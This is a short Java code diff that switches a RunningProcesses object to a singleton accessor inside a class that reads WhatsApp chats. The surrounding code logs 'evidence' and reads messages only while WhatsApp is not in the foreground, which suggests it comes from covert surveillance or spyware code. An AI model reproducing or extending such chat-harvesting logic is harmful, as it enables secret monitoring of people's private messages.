@@ -89,7 +89,7 @@ public class ChatWhatsapp extends SubModuleChat {
 
 			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WHATSAPP, myPhoneNumber);
 
-			RunningProcesses runningProcesses = new RunningProcesses();
+			RunningProcesses runningProcesses = RunningProcesses.self();
 			if(!runningProcesses.getForeground().equals(pObserving)) {
 				readChatWhatsappMessages();
 			}
